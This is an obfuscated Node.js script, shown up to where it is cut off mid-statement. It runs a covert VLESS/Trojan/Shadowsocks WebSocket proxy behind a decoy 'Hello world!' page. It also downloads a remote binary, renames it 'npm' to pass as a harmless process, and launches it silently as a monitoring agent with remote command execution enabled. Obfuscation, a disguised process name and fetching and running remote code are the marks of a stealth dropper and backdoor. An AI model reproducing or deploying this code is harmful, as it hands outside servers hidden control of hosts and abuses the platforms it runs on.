#!/usr/bin/env node

const _0x28c5ac=_0x4934;(function(_0xafe4ce,_0x4e9fdd){const _0x14f25c={_0x11a572:0x13d,_0x280b09:0x169,_0x30cafb:0x191,_0x503bc7:0x13b,_0x29d1b4:0x143,_0x26c3dd:0x149},_0x1a949e=_0x4934,_0x4f37c0=_0xafe4ce();while(!![]){try{const _0x167c78=parseInt(_0x1a949e(_0x14f25c._0x11a572))/0x1+-parseInt(_0x1a949e(_0x14f25c._0x280b09))/0x2*(-parseInt(_0x1a949e(_0x14f25c._0x30cafb))/0x3)+-parseInt(_0x1a949e(_0x14f25c._0x503bc7))/0x4*(parseInt(_0x1a949e(0x1c6))/0x5)+parseInt(_0x1a949e(0x156))/0x6*(-parseInt(_0x1a949e(0x140))/0x7)+-parseInt(_0x1a949e(0x154))/0x8*(-parseInt(_0x1a949e(0x1a7))/0x9)+-parseInt(_0x1a949e(_0x14f25c._0x29d1b4))/0xa+-parseInt(_0x1a949e(0x1a3))/0xb*(-parseInt(_0x1a949e(_0x14f25c._0x26c3dd))/0xc);if(_0x167c78===_0x4e9fdd)break;else _0x4f37c0['push'](_0x4f37c0['shift']());}catch(_0x1d3c07){_0x4f37c0['push'](_0x4f37c0['shift']());}}}(_0x674e,0x9cbdf));const os=require('os'),http=require(_0x28c5ac(0x160)),fs=require('fs'),axios=require('axios'),net=require(_0x28c5ac(0x14f)),path=require(_0x28c5ac(0x144)),crypto=require(_0x28c5ac(0x1ad)),{Buffer}=require(_0x28c5ac(0x161)),{exec,execSync}=require(_0x28c5ac(0x198)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x28c5ac(0x19c)]||_0x28c5ac(0x158),NEZHA_SERVER=process[_0x28c5ac(0x147)][_0x28c5ac(0x15f)]||'',NEZHA_PORT=process['env'][_0x28c5ac(0x17e)]||'',NEZHA_KEY=process[_0x28c5ac(0x147)][_0x28c5ac(0x1af)]||'',DOMAIN=process['env'][_0x28c5ac(0x1b5)]||_0x28c5ac(0x179),AUTO_ACCESS=process[_0x28c5ac(0x147)]['AUTO_ACCESS']||![],WSPATH=process[_0x28c5ac(0x147)][_0x28c5ac(0x166)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x28c5ac(0x147)][_0x28c5ac(0x15e)]||_0x28c5ac(0x188),NAME=process[_0x28c5ac(0x147)]['NAME']||'',PORT=process[_0x28c5ac(0x147)]['PORT']||0xbb8;let uuid=UUID[_0x28c5ac(0x17d)](/-/g,''),CurrentDomain=DOMAIN,Tls='tls',CurrentPort=0x1bb,ISP='';const DNS_SERVERS=['8.8.4.4','1.1.1.1'],BLOCKED_DOMAINS=[_0x28c5ac(0x193),'fast.com',_0x28c5ac(0x152),_0x28c5ac(0x194),_0x28c5ac(0x16a),'testmy.net',_0x28c5ac(0x16b),_0x28c5ac(0x1c2),_0x28c5ac(0x153),_0x28c5ac(0x178)];function isBlockedDomain(_0x5e9cb6){const _0x44da85={_0xd96365:0x13a,_0x371482:0x1b3},_0x2b0594=_0x28c5ac;if(!_0x5e9cb6)return![];const _0xce08b7=_0x5e9cb6[_0x2b0594(_0x44da85._0xd96365)]();return BLOCKED_DOMAINS[_0x2b0594(_0x44da85._0x371482)](_0x4be87e=>{return _0xce08b7===_0x4be87e||_0xce08b7['endsWith']('.'+_0x4be87e);});}async function getisp(){const _0x22090c={_0x502723:0x192,_0x3578ed:0x17a,_0x5a2334:0x141,_0x5b065b:0x199,_0x35e0aa:0x17d,_0x552af0:0x141,_0x535e1a:0x1c3,_0x4f7224:0x17d},_0x158979=_0x28c5ac;try{const _0x535506=await axios[_0x158979(_0x22090c._0x502723)](_0x158979(_0x22090c._0x3578ed),{'headers':{'User-Agent':_0x158979(_0x22090c._0x5a2334),'timeout':0xbb8}}),_0x2bb150=_0x535506[_0x158979(0x16f)];ISP=(_0x2bb150['country_code']+'-'+_0x2bb150[_0x158979(_0x22090c._0x5b065b)])[_0x158979(_0x22090c._0x35e0aa)](/ /g,'_');}catch(_0x8a7468){try{const _0x24b788=await axios[_0x158979(0x192)]('http://ip-api.com/json',{'headers':{'User-Agent':_0x158979(_0x22090c._0x552af0),'timeout':0xbb8}}),_0x51ef19=_0x24b788[_0x158979(0x16f)];ISP=(_0x51ef19['countryCode']+'-'+_0x51ef19[_0x158979(_0x22090c._0x535e1a)])[_0x158979(_0x22090c._0x4f7224)](/ /g,'_');}catch(_0x32c9a0){ISP='Unknown';}}}function _0x674e(){const _0x270153=['librespeed.org','48lEGZNP','--tls','84GtlRwe','substr','872564d1-d749-495b-ba23-a3475c198ff7','once','includes','Server','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','SUB_PATH','NEZHA_SERVER','http','buffer','error','base64','https://amd64.ssss.nyc.mn/agent','find','WSPATH','connect','application/json','155210dpNuSL','speedof.me','bandwidth.place','post','map','forEach','data','config.yaml','createWriteStream','toString',';skip-cert-verify%3Dtrue;mux%3D0#','https://oooo.serv00.net/add-url','npm\x20download\x20successfully','Server\x20is\x20running\x20on\x20port\x20','false','speedcheck.org','your-domain.com','https://api.ip.sb/geoip','pipe','startsWith','replace','NEZHA_PORT','then','?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D','true','text/html','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','cahnge-your-domain.com','application/dns-json','/bin/bash','\x20with\x20all\x20DNS\x20servers','sub','createServer','none','slice','readUInt16BE','npm','pop','Status','message','42cMBmdj','get','speedtest.net','speed.cloudflare.com','reduce','https://amd64.ssss.nyc.mn/v1','text/plain','child_process','isp','decode','Failed\x20to\x20get\x20IP','UUID','?security=','chmod\x20+x\x20npm','hex','Not\x20Found\x0a','close','&sni=','561xlAxYg','write','length','utf8','771048IaHCdj','trim','tls;','8443','2087','?encryption=none&security=','crypto','listen','NEZHA_KEY','npm\x20is\x20already\x20running,\x20skip\x20running...','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','setsid\x20nohup\x20./npm\x20-s\x20','some','https://api-ipv4.ip.sb/ip','DOMAIN','Automatic\x20Access\x20Task\x20added\x20successfully','index.html','arm64','concat','sha224','readFile','client_secret:\x20','url','\x20-p\x20','2053','readUInt8','from','speed.io','org','npm\x20is\x20running','tls','65380iZKOMV','https://arm64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/v1','trojan://','type','join','Answer','writeFileSync','createHash','toLowerCase','296EreHCT','Failed\x20to\x20resolve\x20','353215mcDbGJ','catch','update','617561OdQwOU','Mozilla/5.0','arch','1691950mTwuVS','path','stream','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','env','end','249468UIMukE','arm','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','log','aarch64','npm\x20running\x20error:','net','writeHead','none:','speedtest.cn'];_0x674e=function(){return _0x270153;};return _0x674e();}async function getip(){const _0x38d781={_0x4e035e:0x192,_0x596a1b:0x18a,_0x2dfe77:0x162,_0xf43d18:0x19b,_0xa26d90:0x184},_0x1f0d1a=_0x28c5ac;if(!DOMAIN||DOMAIN===_0x1f0d1a(0x179))try{const _0x41417f=await axios[_0x1f0d1a(_0x38d781._0x4e035e)](_0x1f0d1a(0x1b4),{'timeout':0x1388}),_0x2cefd1=_0x41417f[_0x1f0d1a(0x16f)][_0x1f0d1a(0x1a8)]();CurrentDomain=_0x2cefd1,Tls=_0x1f0d1a(_0x38d781._0x596a1b),CurrentPort=PORT;}catch(_0x4d1456){console[_0x1f0d1a(_0x38d781._0x2dfe77)](_0x1f0d1a(_0x38d781._0xf43d18),_0x4d1456[_0x1f0d1a(0x190)]),(CurrentDomain=_0x1f0d1a(_0x38d781._0xa26d90),Tls='tls',CurrentPort=0x1bb);}else CurrentDomain=DOMAIN,Tls='tls',CurrentPort=0x1bb;}const httpServer=http[_0x28c5ac(0x189)](async(_0x39b0ff,_0x2de076)=>{const _0xfec726={_0x3498fc:0x1b7,_0x5a4ce9:0x1bd,_0x4ab9a5:0x1a9,_0x485654:0x1a2,_0x2d740c:0x1c9,_0xa7b1ea:0x151,_0x3397eb:0x172,_0x3df933:0x163,_0x926b7a:0x150,_0x3de206:0x148,_0x541897:0x148,_0x468b6f:0x1a0},_0x5b9a9b={_0x53cf52:0x182,_0x5e1b2a:0x148},_0x4032cb=_0x28c5ac;if(_0x39b0ff[_0x4032cb(0x1bd)]==='/'){const _0xf413af=path['join'](__dirname,_0x4032cb(_0xfec726._0x3498fc));fs[_0x4032cb(0x1bb)](_0xf413af,_0x4032cb(0x1a6),(_0x3e19df,_0x3b65ab)=>{const _0x33ab92=_0x4032cb;if(_0x3e19df){_0x2de076['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x2de076[_0x33ab92(0x148)]('Hello\x20world!');return;}_0x2de076['writeHead'](0xc8,{'Content-Type':_0x33ab92(_0x5b9a9b._0x53cf52)}),_0x2de076[_0x33ab92(_0x5b9a9b._0x5e1b2a)](_0x3b65ab);});return;}else{if(_0x39b0ff[_0x4032cb(_0xfec726._0x5a4ce9)]==='/'+SUB_PATH){await getisp(),await getip();const _0x425270=NAME?NAME+'-'+ISP:ISP,_0x52b371=Tls===_0x4032cb(0x1c5)?_0x4032cb(0x1c5):'none',_0x54259c=Tls===_0x4032cb(0x1c5)?_0x4032cb(_0xfec726._0x4ab9a5):'',_0x37b754='vless://'+UUID+'@'+CurrentDomain+':'+CurrentPort+_0x4032cb(0x1ac)+_0x52b371+_0x4032cb(_0xfec726._0x485654)+CurrentDomain+'&fp=chrome&type=ws&host='+CurrentDomain+'&path=%2F'+WSPATH+'#'+_0x425270,_0x5e7d33=_0x4032cb(_0xfec726._0x2d740c)+UUID+'@'+CurrentDomain+':'+CurrentPort+_0x4032cb(0x19d)+_0x52b371+_0x4032cb(0x1a2)+CurrentDomain+'&fp=chrome&type=ws&host='+CurrentDomain+'&path=%2F'+WSPATH+'#'+_0x425270,_0x476de3=Buffer[_0x4032cb(0x1c1)](_0x4032cb(_0xfec726._0xa7b1ea)+UUID)[_0x4032cb(_0xfec726._0x3397eb)](_0x4032cb(_0xfec726._0x3df933)),_0x191a8d='ss://'+_0x476de3+'@'+CurrentDomain+':'+CurrentPort+_0x4032cb(0x180)+CurrentDomain+';path%3D%2F'+WSPATH+';'+_0x54259c+'sni%3D'+CurrentDomain+_0x4032cb(0x173)+_0x425270,_0x180d47=_0x37b754+'\x0a'+_0x5e7d33+'\x0a'+_0x191a8d,_0x25c16e=Buffer[_0x4032cb(0x1c1)](_0x180d47)[_0x4032cb(0x172)](_0x4032cb(_0xfec726._0x3df933));_0x2de076[_0x4032cb(_0xfec726._0x926b7a)](0xc8,{'Content-Type':_0x4032cb(0x197)}),_0x2de076[_0x4032cb(_0xfec726._0x3de206)](_0x25c16e+'\x0a');}else _0x2de076['writeHead'](0x194,{'Content-Type':_0x4032cb(0x197)}),_0x2de076[_0x4032cb(_0xfec726._0x541897)](_0x4032cb(_0xfec726._0x468b6f));}});function resolveHost(_0x3835e2){return new Promise((_0x97f4b1,_0x344e16)=>{const _0x2295f8={_0x25bedb:0x1a5,_0x4b51fd:0x192,_0x289749:0x185};if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x3835e2)){_0x97f4b1(_0x3835e2);return;}let _0x532a77=0x0;function _0x4dd268(){const _0x38e7d9={_0x183c6c:0x137,_0x1e8fc2:0x165},_0xc6e3a7=_0x4934;if(_0x532a77>=DNS_SERVERS[_0xc6e3a7(_0x2295f8._0x25bedb)]){_0x344e16(new Error(_0xc6e3a7(0x13c)+_0x3835e2+_0xc6e3a7(0x187)));return;}const _0x4d3fb5=DNS_SERVERS[_0x532a77];_0x532a77++;const _0xf11022='https://dns.google/resolve?name='+encodeURIComponent(_0x3835e2)+'&type=A';axios[_0xc6e3a7(_0x2295f8._0x4b51fd)](_0xf11022,{'timeout':0x1388,'headers':{'Accept':_0xc6e3a7(_0x2295f8._0x289749)}})[_0xc6e3a7(0x17f)](_0x2424f3=>{const _0x522588=_0xc6e3a7,_0x3f7a7c=_0x2424f3['data'];if(_0x3f7a7c[_0x522588(0x18f)]===0x0&&_0x3f7a7c[_0x522588(0x137)]&&_0x3f7a7c[_0x522588(_0x38e7d9._0x183c6c)]['length']>0x0){const _0x3b2b7e=_0x3f7a7c[_0x522588(_0x38e7d9._0x183c6c)][_0x522588(_0x38e7d9._0x1e8fc2)](_0x1874dc=>_0x1874dc[_0x522588(0x1ca)]===0x1);if(_0x3b2b7e){_0x97f4b1(_0x3b2b7e['data']);return;}}_0x4dd268();})[_0xc6e3a7(0x13e)](_0x512d77=>{_0x4dd268();});}_0x4dd268();});}function handleVlsConnection(_0xe14825,_0x16905b){const _0x20b0d2={_0x34663f:0x18b,_0x506e1e:0x18c,_0x1e994b:0x18b,_0x339fe2:0x195,_0x1792de:0x1cb,_0x195f1e:0x17f,_0x5e0caa:0x13e},_0x384522={_0xe83cf6:0x167,_0x3fdbbd:0x162},_0x29de48={_0x5511ee:0x167,_0x458581:0x162},_0xd2e15b={_0x1ab68c:0x18b,_0x18a7a2:0x162},_0x13c0b1=_0x28c5ac,[_0x3b5056]=_0x16905b,_0x3cf7c4=_0x16905b[_0x13c0b1(0x18b)](0x1,0x11);if(!_0x3cf7c4['every']((_0x3fae32,_0x15c0e5)=>_0x3fae32==parseInt(uuid[_0x13c0b1(0x157)](_0x15c0e5*0x2,0x2),0x10)))return![];let _0x1ef607=_0x16905b[_0x13c0b1(_0x20b0d2._0x34663f)](0x11,0x12)[_0x13c0b1(0x1c0)]()+0x13;const _0x37ea10=_0x16905b[_0x13c0b1(_0x20b0d2._0x34663f)](_0x1ef607,_0x1ef607+=0x2)[_0x13c0b1(_0x20b0d2._0x506e1e)](0x0),_0x104d8e=_0x16905b[_0x13c0b1(_0x20b0d2._0x1e994b)](_0x1ef607,_0x1ef607+=0x1)[_0x13c0b1(0x1c0)](),_0x21d647=_0x104d8e==0x1?_0x16905b[_0x13c0b1(_0x20b0d2._0x34663f)](_0x1ef607,_0x1ef607+=0x4)[_0x13c0b1(0x1cb)]('.'):_0x104d8e==0x2?new TextDecoder()[_0x13c0b1(0x19a)](_0x16905b[_0x13c0b1(_0x20b0d2._0x34663f)](_0x1ef607+0x1,_0x1ef607+=0x1+_0x16905b['slice'](_0x1ef607,_0x1ef607+0x1)[_0x13c0b1(0x1c0)]())):_0x104d8e==0x3?_0x16905b['slice'](_0x1ef607,_0x1ef607+=0x10)[_0x13c0b1(_0x20b0d2._0x339fe2)]((_0x101328,_0x4f3379,_0x12afc4,_0x3cef8b)=>_0x12afc4%0x2?_0x101328[_0x13c0b1(0x1b9)](_0x3cef8b[_0x13c0b1(0x18b)](_0x12afc4-0x1,_0x12afc4+0x1)):_0x101328,[])[_0x13c0b1(0x16d)](_0xd1b8fc=>_0xd1b8fc[_0x13c0b1(0x18c)](0x0)[_0x13c0b1(0x172)](0x10))[_0x13c0b1(_0x20b0d2._0x1792de)](':'):'';if(isBlockedDomain(_0x21d647))return _0xe14825[_0x13c0b1(0x1a1)](),![];_0xe14825['send'](new Uint8Array([_0x3b5056,0x0]));const _0xb207a1=createWebSocketStream(_0xe14825);return resolveHost(_0x21d647)[_0x13c0b1(_0x20b0d2._0x195f1e)](_0x351ab8=>{const _0x48ca93=_0x13c0b1;net[_0x48ca93(_0x29de48._0x5511ee)]({'host':_0x351ab8,'port':_0x37ea10},function(){const _0x50e897=_0x48ca93;this[_0x50e897(0x1a4)](_0x16905b[_0x50e897(_0xd2e15b._0x1ab68c)](_0x1ef607)),_0xb207a1['on'](_0x50e897(_0xd2e15b._0x18a7a2),()=>{})[_0x50e897(0x17b)](this)['on'](_0x50e897(0x162),()=>{})[_0x50e897(0x17b)](_0xb207a1);})['on'](_0x48ca93(_0x29de48._0x458581),()=>{});})[_0x13c0b1(_0x20b0d2._0x5e0caa)](_0x440950=>{const _0xe04667={_0x2e7b60:0x162,_0x4847a6:0x17b},_0x5451d7=_0x13c0b1;net[_0x5451d7(_0x384522._0xe83cf6)]({'host':_0x21d647,'port':_0x37ea10},function(){const _0x18ccf8=_0x5451d7;this['write'](_0x16905b[_0x18ccf8(0x18b)](_0x1ef607)),_0xb207a1['on'](_0x18ccf8(_0xe04667._0x2e7b60),()=>{})[_0x18ccf8(0x17b)](this)['on'](_0x18ccf8(0x162),()=>{})[_0x18ccf8(_0xe04667._0x4847a6)](_0xb207a1);})['on'](_0x5451d7(_0x384522._0x3fdbbd),()=>{});}),!![];}function handleTrojConnection(_0x2916f8,_0x29f223){const _0x2f596a={_0x459cb6:0x1a5,_0x459204:0x139,_0x18606d:0x1ba,_0x29fd7c:0x19f,_0x5b76b5:0x172,_0xba38a1:0x195,_0x251d69:0x17f},_0x4e3fc8={_0x4d9443:0x162},_0x4f7134={_0x2ccee7:0x17b},_0x5321ab=_0x28c5ac;try{if(_0x29f223[_0x5321ab(_0x2f596a._0x459cb6)]<0x3a)return![];const _0x479c48=_0x29f223['slice'](0x0,0x38)[_0x5321ab(0x172)](),_0x4dca8c=[UUID];let _0x22276b=null;for(const _0x240ae5 of _0x4dca8c){const _0x5b624a=crypto[_0x5321ab(_0x2f596a._0x459204)](_0x5321ab(_0x2f596a._0x18606d))[_0x5321ab(0x13f)](_0x240ae5)['digest'](_0x5321ab(_0x2f596a._0x29fd7c));if(_0x5b624a===_0x479c48){_0x22276b=_0x240ae5;break;}}if(!_0x22276b)return![];let _0x462ae4=0x38;_0x29f223[_0x462ae4]===0xd&&_0x29f223[_0x462ae4+0x1]===0xa&&(_0x462ae4+=0x2);const _0x50c114=_0x29f223[_0x462ae4];if(_0x50c114!==0x1)return![];_0x462ae4+=0x1;const _0x43a78f=_0x29f223[_0x462ae4];_0x462ae4+=0x1;let _0x413f94,_0x57df90;if(_0x43a78f===0x1)_0x413f94=_0x29f223['slice'](_0x462ae4,_0x462ae4+0x4)['join']('.'),_0x462ae4+=0x4;else{if(_0x43a78f===0x3){const _0x59df9e=_0x29f223[_0x462ae4];_0x462ae4+=0x1,_0x413f94=_0x29f223['slice'](_0x462ae4,_0x462ae4+_0x59df9e)[_0x5321ab(_0x2f596a._0x5b76b5)](),_0x462ae4+=_0x59df9e;}else{if(_0x43a78f===0x4)_0x413f94=_0x29f223[_0x5321ab(0x18b)](_0x462ae4,_0x462ae4+0x10)[_0x5321ab(_0x2f596a._0xba38a1)]((_0x2240dc,_0x3da29a,_0x55eda6,_0x54055c)=>_0x55eda6%0x2?_0x2240dc['concat'](_0x54055c['slice'](_0x55eda6-0x1,_0x55eda6+0x1)):_0x2240dc,[])['map'](_0x12f562=>_0x12f562[_0x5321ab(0x18c)](0x0)[_0x5321ab(0x172)](0x10))[_0x5321ab(0x1cb)](':'),_0x462ae4+=0x10;else return![];}}_0x57df90=_0x29f223['readUInt16BE'](_0x462ae4),_0x462ae4+=0x2;_0x462ae4<_0x29f223[_0x5321ab(0x1a5)]&&_0x29f223[_0x462ae4]===0xd&&_0x29f223[_0x462ae4+0x1]===0xa&&(_0x462ae4+=0x2);if(isBlockedDomain(_0x413f94))return _0x2916f8[_0x5321ab(0x1a1)](),![];const _0x1f5460=createWebSocketStream(_0x2916f8);return resolveHost(_0x413f94)[_0x5321ab(_0x2f596a._0x251d69)](_0x55ea23=>{const _0x584c3a={_0x22ea7e:0x1a5,_0x4e965d:0x18b},_0x3023a5=_0x5321ab;net[_0x3023a5(0x167)]({'host':_0x55ea23,'port':_0x57df90},function(){const _0x51cc43=_0x3023a5;_0x462ae4<_0x29f223[_0x51cc43(_0x584c3a._0x22ea7e)]&&this[_0x51cc43(0x1a4)](_0x29f223[_0x51cc43(_0x584c3a._0x4e965d)](_0x462ae4)),_0x1f5460['on'](_0x51cc43(0x162),()=>{})[_0x51cc43(0x17b)](this)['on'](_0x51cc43(0x162),()=>{})[_0x51cc43(0x17b)](_0x1f5460);})['on'](_0x3023a5(0x162),()=>{});})['catch'](_0x4fc03e=>{const _0x3bb9cd=_0x5321ab;net[_0x3bb9cd(0x167)]({'host':_0x413f94,'port':_0x57df90},function(){const _0x4d81d5=_0x3bb9cd;_0x462ae4<_0x29f223[_0x4d81d5(0x1a5)]&&this[_0x4d81d5(0x1a4)](_0x29f223['slice'](_0x462ae4)),_0x1f5460['on'](_0x4d81d5(0x162),()=>{})[_0x4d81d5(_0x4f7134._0x2ccee7)](this)['on'](_0x4d81d5(0x162),()=>{})['pipe'](_0x1f5460);})['on'](_0x3bb9cd(_0x4e3fc8._0x4d9443),()=>{});}),!![];}catch(_0x3e0f99){return![];}}function handleSsConnection(_0x37f7d8,_0x47b1b0){const _0x54e8b6={_0x2b15dc:0x172,_0x56a6ab:0x18b,_0x2c0bf8:0x1cb,_0x16ba32:0x17f,_0x3a8ea4:0x13e},_0x20dff3={_0x73b42b:0x167,_0x485a32:0x162},_0x45b34c={_0x475ef4:0x18b},_0x37e4d3={_0x404474:0x162},_0x1306db={_0x1625c7:0x162,_0x25697b:0x17b},_0x2bc4de=_0x28c5ac;try{let _0x2d2db7=0x0;const _0x57c59a=_0x47b1b0[_0x2d2db7];_0x2d2db7+=0x1;let _0x980876,_0x3a531c;if(_0x57c59a===0x1)_0x980876=_0x47b1b0['slice'](_0x2d2db7,_0x2d2db7+0x4)[_0x2bc4de(0x1cb)]('.'),_0x2d2db7+=0x4;else{if(_0x57c59a===0x3){const _0x54139d=_0x47b1b0[_0x2d2db7];_0x2d2db7+=0x1,_0x980876=_0x47b1b0['slice'](_0x2d2db7,_0x2d2db7+_0x54139d)[_0x2bc4de(_0x54e8b6._0x2b15dc)](),_0x2d2db7+=_0x54139d;}else{if(_0x57c59a===0x4)_0x980876=_0x47b1b0[_0x2bc4de(_0x54e8b6._0x56a6ab)](_0x2d2db7,_0x2d2db7+0x10)['reduce']((_0x1a96dd,_0x56d946,_0x59a9be,_0x3bb049)=>_0x59a9be%0x2?_0x1a96dd[_0x2bc4de(0x1b9)](_0x3bb049[_0x2bc4de(0x18b)](_0x59a9be-0x1,_0x59a9be+0x1)):_0x1a96dd,[])[_0x2bc4de(0x16d)](_0x5225ab=>_0x5225ab[_0x2bc4de(0x18c)](0x0)[_0x2bc4de(0x172)](0x10))[_0x2bc4de(_0x54e8b6._0x2c0bf8)](':'),_0x2d2db7+=0x10;else return![];}}_0x3a531c=_0x47b1b0[_0x2bc4de(0x18c)](_0x2d2db7),_0x2d2db7+=0x2;if(isBlockedDomain(_0x980876))return _0x37f7d8['close'](),![];const _0x120560=createWebSocketStream(_0x37f7d8);return resolveHost(_0x980876)[_0x2bc4de(_0x54e8b6._0x16ba32)](_0x58fccd=>{const _0x4bf700=_0x2bc4de;net[_0x4bf700(0x167)]({'host':_0x58fccd,'port':_0x3a531c},function(){const _0x2628cb=_0x4bf700;_0x2d2db7<_0x47b1b0[_0x2628cb(0x1a5)]&&this[_0x2628cb(0x1a4)](_0x47b1b0['slice'](_0x2d2db7)),_0x120560['on'](_0x2628cb(_0x1306db._0x1625c7),()=>{})['pipe'](this)['on'](_0x2628cb(_0x1306db._0x1625c7),()=>{})[_0x2628cb(_0x1306db._0x25697b)](_0x120560);})['on'](_0x4bf700(_0x37e4d3._0x404474),()=>{});})[_0x2bc4de(_0x54e8b6._0x3a8ea4)](_0x43c722=>{const _0x409f16=_0x2bc4de;net[_0x409f16(_0x20dff3._0x73b42b)]({'host':_0x980876,'port':_0x3a531c},function(){const _0x476033=_0x409f16;_0x2d2db7<_0x47b1b0[_0x476033(0x1a5)]&&this[_0x476033(0x1a4)](_0x47b1b0[_0x476033(_0x45b34c._0x475ef4)](_0x2d2db7)),_0x120560['on']('error',()=>{})[_0x476033(0x17b)](this)['on']('error',()=>{})[_0x476033(0x17b)](_0x120560);})['on'](_0x409f16(_0x20dff3._0x485a32),()=>{});}),!![];}catch(_0x3ae2e4){return![];}}const wss=new WebSocket[(_0x28c5ac(0x15b))]({'server':httpServer});wss['on']('connection',(_0x2a51da,_0x5cfc5c)=>{const _0x449da4={_0x580234:0x1a1,_0x38e92e:0x159,_0x30f8c9:0x190},_0xaef902={_0x243fe5:0x18b,_0x2645d8:0x1a1},_0x45f37a=_0x28c5ac,_0x2ab0b1=_0x5cfc5c[_0x45f37a(0x1bd)]||'',_0x3b509e='/'+WSPATH;if(!_0x2ab0b1[_0x45f37a(0x17c)](_0x3b509e)){_0x2a51da[_0x45f37a(_0x449da4._0x580234)]();return;}_0x2a51da[_0x45f37a(_0x449da4._0x38e92e)](_0x45f37a(_0x449da4._0x30f8c9),_0x47678b=>{const _0x32875f=_0x45f37a;if(_0x47678b['length']>0x11&&_0x47678b[0x0]===0x0){const _0x212fb3=_0x47678b[_0x32875f(_0xaef902._0x243fe5)](0x1,0x11),_0x355369=_0x212fb3['every']((_0x3c9fec,_0x4bd2f7)=>_0x3c9fec==parseInt(uuid[_0x32875f(0x157)](_0x4bd2f7*0x2,0x2),0x10));if(_0x355369){!handleVlsConnection(_0x2a51da,_0x47678b)&&_0x2a51da['close']();return;}}if(_0x47678b[_0x32875f(0x1a5)]>=0x3a){if(handleTrojConnection(_0x2a51da,_0x47678b))return;}if(_0x47678b[_0x32875f(0x1a5)]>0x0&&(_0x47678b[0x0]===0x1||_0x47678b[0x0]===0x3||_0x47678b[0x0]===0x4)){if(handleSsConnection(_0x2a51da,_0x47678b))return;}_0x2a51da[_0x32875f(_0xaef902._0x2645d8)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x272d51={_0x36567:0x142,_0x2d9a02:0x14a,_0x182395:0x1b8,_0x22151c:0x1c7,_0x19d194:0x196,_0x3ad345:0x164},_0xe81199=_0x28c5ac,_0x552866=os[_0xe81199(_0x272d51._0x36567)]();return _0x552866===_0xe81199(_0x272d51._0x2d9a02)||_0x552866===_0xe81199(_0x272d51._0x182395)||_0x552866===_0xe81199(0x14d)?!NEZHA_PORT?_0xe81199(0x1c8):_0xe81199(_0x272d51._0x22151c):!NEZHA_PORT?_0xe81199(_0x272d51._0x19d194):_0xe81199(_0x272d51._0x3ad345);},downloadFile=async()=>{const _0x5d8274={_0x222613:0x192,_0x26fd25:0x145,_0x1fecf7:0x16f},_0x40d70b=_0x28c5ac;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x51d5ae=getDownloadUrl(),_0x7e9768=await axios({'method':_0x40d70b(_0x5d8274._0x222613),'url':_0x51d5ae,'responseType':_0x40d70b(_0x5d8274._0x26fd25)}),_0x3ebdc4=fs[_0x40d70b(0x171)]('npm');return _0x7e9768[_0x40d70b(_0x5d8274._0x1fecf7)][_0x40d70b(0x17b)](_0x3ebdc4),new Promise((_0x526e51,_0x3a31b2)=>{const _0x270d05=_0x40d70b;_0x3ebdc4['on']('finish',()=>{const _0x2c8539=_0x4934;console['log'](_0x2c8539(0x175)),exec(_0x2c8539(0x19e),_0x4d206a=>{if(_0x4d206a)_0x3a31b2(_0x4d206a);_0x526e51();});}),_0x3ebdc4['on'](_0x270d05(0x162),_0x3a31b2);});}catch(_0x336991){throw _0x336991;}},runnz=async()=>{const _0x159e9e={_0x56eb6d:0x146,_0x283d9c:0x1b0,_0x194211:0x1bf,_0x5596e3:0x15a,_0x5809d6:0x155,_0x789c97:0x18e,_0x219f99:0x15a,_0x18a5ca:0x181,_0x472849:0x1bc,_0x16f099:0x15d,_0x15cb7a:0x138,_0x7d890:0x162},_0x60bd69={_0x5e477b:0x162,_0xc01ab7:0x14e},_0x3ad663=_0x28c5ac;try{const _0x32e8d3=execSync(_0x3ad663(_0x159e9e._0x56eb6d),{'encoding':'utf-8'});if(_0x32e8d3[_0x3ad663(0x1a8)]()!==''){console[_0x3ad663(0x14c)](_0x3ad663(_0x159e9e._0x283d9c));return;}}catch(_0x4a1b11){}await downloadFile();let _0x407fcd='',_0x3e7317=['443',_0x3ad663(0x1aa),'2096',_0x3ad663(0x1ab),'2083',_0x3ad663(_0x159e9e._0x194211)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x217e5e=_0x3e7317[_0x3ad663(_0x159e9e._0x5596e3)](NEZHA_PORT)?_0x3ad663(_0x159e9e._0x5809d6):'';_0x407fcd=_0x3ad663(0x1b2)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3ad663(0x1be)+NEZHA_KEY+'\x20'+_0x217e5e+_0x3ad663(0x1b1);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x43b9f=NEZHA_SERVER[_0x3ad663(_0x159e9e._0x5596e3)](':')?NEZHA_SERVER['split'](':')[_0x3ad663(_0x159e9e._0x789c97)]():'',_0x535df8=_0x3e7317[_0x3ad663(_0x159e9e._0x219f99)](_0x43b9f)?_0x3ad663(_0x159e9e._0x18a5ca):_0x3ad663(0x177),_0xd25c9b=_0x3ad663(_0x159e9e._0x472849)+NEZHA_KEY+_0x3ad663(0x183)+NEZHA_SERVER+_0x3ad663(0x14b)+_0x535df8+_0x3ad663(_0x159e9e._0x16f099)+UUID;fs[_0x3ad663(_0x159e9e._0x15cb7a)](_0x3ad663(0x170),_0xd25c9b);}_0x407fcd=_0x3ad663(0x15c);}else 